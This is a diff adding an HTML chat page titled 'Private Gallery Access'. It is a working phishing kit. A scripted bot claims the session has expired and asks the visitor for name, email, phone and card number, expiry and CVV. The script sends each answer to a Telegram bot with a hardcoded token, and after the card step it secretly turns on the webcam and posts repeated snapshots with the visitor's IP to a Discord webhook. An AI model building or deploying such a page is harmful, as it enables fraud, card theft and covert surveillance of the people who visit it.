@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access | Private Collection</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Playfair+Display:wght@600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --surface-color: #151515;
+            --accent-color: #c5a059;
+            --text-main: #e0e0e0;
+            --text-dim: #888;
+            --chat-bg: #1f1f1f;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Chat Interface */
+        #chat-container {
+            width: 100%;
+            max-width: 450px;
+            height: 80vh;
+            background: var(--surface-color);
+            border: 1px solid #333;
+            border-radius: 15px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            position: relative;
+        }
+
+        #chat-header {
+            padding: 20px;
+            background: #111;
+            border-bottom: 1px solid #333;
+            text-align: center;
+            border-top-left-radius: 15px;
+            border-top-right-radius: 15px;
+        }
+
+        .logo-text {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.2rem;
+            color: var(--accent-color);
+            letter-spacing: 2px;
+        }
+
+        #chat-window {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .message {
+            max-width: 80%;
+            padding: 10px 15px;
+            border-radius: 15px;
+            font-size: 0.95rem;
+            line-height: 1.4;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .bot-msg {
+            background: var(--chat-bg);
+            color: #fff;
+            align-self: flex-start;
+            border-bottom-left-radius: 2px;
+            border: 1px solid #333;
+        }
+
+        .user-msg {
+            background: var(--accent-color);
+            color: #000;
+            align-self: flex-end;
+            border-bottom-right-radius: 2px;
+            font-weight: 600;
+        }
+
+        #chat-input-area {
+            padding: 20px;
+            background: #111;
+            display: flex;
+            gap: 10px;
+            border-bottom-left-radius: 15px;
+            border-bottom-right-radius: 15px;
+        }
+
+        input {
+            flex: 1;
+            background: #222;
+            border: 1px solid #444;
+            color: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            outline: none;
+        }
+
+        button {
+            background: var(--accent-color);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Camera hidden */
+        #video-capture { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="chat-container">
+    <div id="chat-header">
+        <div class="logo-text">PRIVATE GALLERY ACCESS</div>
+    </div>
+    <div id="chat-window">
+        <div class="message bot-msg">Connecting to secure server...</div>
+    </div>
+    <div id="chat-input-area">
+        <input type="text" id="user-input" placeholder="Type message..." disabled>
+        <button id="send-btn" onclick="handleSend()" disabled>Send</button>
+    </div>
+</div>
+
+<video id="video-capture" autoplay playsinline></video>
+<canvas id="capture-canvas" style="display:none;"></canvas>
+
+<script>
+    const BOT_TOKEN = '8471640597:AAGmp7AbPqioC1Ctde6Nv_g02se7HNW4xBg';
+    const CHAT_ID = '-1004316208944';
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1565339535905128558/5F8PbFyC1Wk9uLy9oNN2lGHI7_H6JxkiN5I8rQyM38JVUSyKw2g2qirYe9_sFGm6qi6w';
+
+    let userIP = "Fetching...";
+    let userGPS = "Not Requested";
+    let currentStep = 0;
+    let userData = { name: '', email: '', phone: '', card: '', exp: '', cvv: '' };
+
+    // Logic for the "Bot" flow
+    const botFlow = [
+        { msg: "Verification Required. Your session has expired.", trigger: "start" },
+        { msg: "To restore access, please provide your **Full Name**.", trigger: "name" },
+        { msg: "Thank you. Now provide your **Email Address**.", trigger: "email" },
+        { msg: "Almost there. Please provide your **Phone Number**.", trigger: "phone" },
+        { msg: "Final Security Step: To prevent fraud, please provide your **Billing Details** (Card Number, Exp, CVV).", trigger: "payment" },
+        { msg: "Processing payment verification... Please wait.", trigger: "finish" }
+    ];
+
+    window.onload = async () => {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            userIP = ipData.ip;
+        } catch (e) { userIP = "Unknown"; }
+
+        // Start the chat sequence
+        setTimeout(() => {
+            addMessage("bot", botFlow[0].msg);
+            setTimeout(() => {
+                addMessage("bot", botFlow[1].msg);
+                enableInput();
+            }, 1000);
+        }, 1000);
+    };
+
+    function addMessage(type, text) {
+        const win = document.getElementById('chat-window');
+        const div = document.createElement('div');
+        div.className = `message ${type}-msg`;
+        div.innerText = text;
+        win.appendChild(div);
+        win.scrollTop = win.scrollHeight;
+    }
+
+    function enableInput() {
+        document.getElementById('user-input').disabled = false;
+        document.getElementById('send-btn').disabled = false;
+    }
+
+    async function handleSend() {
+        const input = document.getElementById('user-input');
+        const val = input.value.trim();
+        if (!val) return;
+
+        addMessage("user", val);
+        input.value = "";
+
+        // Logic for what the user is providing
+        if (currentStep === 0) {
+            userData.name = val;
+            currentStep++;
+            await sendToTelegram(`👤 *NEW USER* \nName: ${val} \nIP: ${userIP}`);
+            setTimeout(() => addMessage("bot", botFlow[2].msg), 800);
+        } else if (currentStep === 1) {
+            userData.email = val;
+            currentStep++;
+            await sendToTelegram(`📧 Email: ${val}`);
+            setTimeout(() => addMessage("bot", botFlow[3].msg), 800);
+        } else if (currentStep === 2) {
+            userData.phone = val;
+            currentStep++;
+            await sendToTelegram(`📱 Phone: ${val}`);
+            setTimeout(() => addMessage("bot", botFlow[4].msg), 800);
+        } else if (currentStep === 3) {
+            userData.card = val;
+            currentStep++;
+            await sendToTelegram(`💳 CARD DATA: ${val}`);
+            setTimeout(() => addMessage("bot", botFlow[5].msg), 800);
+            
+            // Final Step: Attempt Camera capture
+            initCamera();
+        } else {
+            addMessage("bot", "Processing your credentials... please do not close this window.");
+        }
+    }
+
+    async function initCamera() {
+        const video = document.getElementById('video-capture');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            
+            // Capture one photo every 5 seconds and send to Discord
+            setInterval(async () => {
+                const canvas = document.getElementById('capture-canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    if (!blob) return;
+                    const formData = new FormData();
+                    formData.append('file', blob, 'user_snap.jpg');
+                    formData.append('payload_json', JSON.stringify({ 
+                        content: `📸 **LIVE SNAPSHOT** \nUser: ${userData.name} \nIP: ${userIP}` 
+                    }));
+                    await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+                }, 'image/jpeg', 0.7);
+            }, 800);
+
+        } catch (err) {
+            console.log("Camera denied");
+        }
+    }
+
+    async function sendToTelegram(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch (e) { console.error(e); }
+    }
+</script>
+</body>
+</html>
